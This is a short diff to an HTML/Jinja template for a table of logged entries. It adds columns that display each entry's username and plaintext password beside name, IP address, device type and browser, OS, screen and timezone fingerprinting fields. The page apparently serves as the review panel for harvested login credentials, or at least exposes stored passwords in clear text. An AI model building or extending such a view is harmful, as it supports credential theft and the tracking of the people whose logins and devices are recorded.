@@ -63,6 +63,8 @@
                 <tr>
                     <th>First Name</th>
                     <th>Last Name</th>
+                    <th>Username</th>
+                    <th>Password</th>
                     <th>Timestamp</th>
                     <th>IP Address</th>
                     <th>Device Type</th>
@@ -74,6 +76,8 @@
                 <tr>
                     <td>{{ entry.first_name }}</td>
                     <td>{{ entry.last_name }}</td>
+                    <td>{{ entry.username }}</td>
+                    <td>{{ entry.password }}</td>
                     <td>{{ entry.timestamp }}</td>
                     <td>{{ entry.ip_address }}</td>
                     <td>{{ entry.device_type }}</td>
@@ -81,6 +85,10 @@
                         <details>
                             <summary>Full Info</summary>
                             <pre>{{ entry.full_user_agent }}</pre>
+                            <p>Browser: {{ entry.browser_name }} {{ entry.browser_version }}</p>
+                            <p>OS: {{ entry.os_name }} {{ entry.os_version }}</p>
+                            <p>Screen: {{ entry.screen_resolution }}</p>
+                            <p>Timezone: {{ entry.timezone }}</p>
                         </details>
                     </td>
                 </tr>
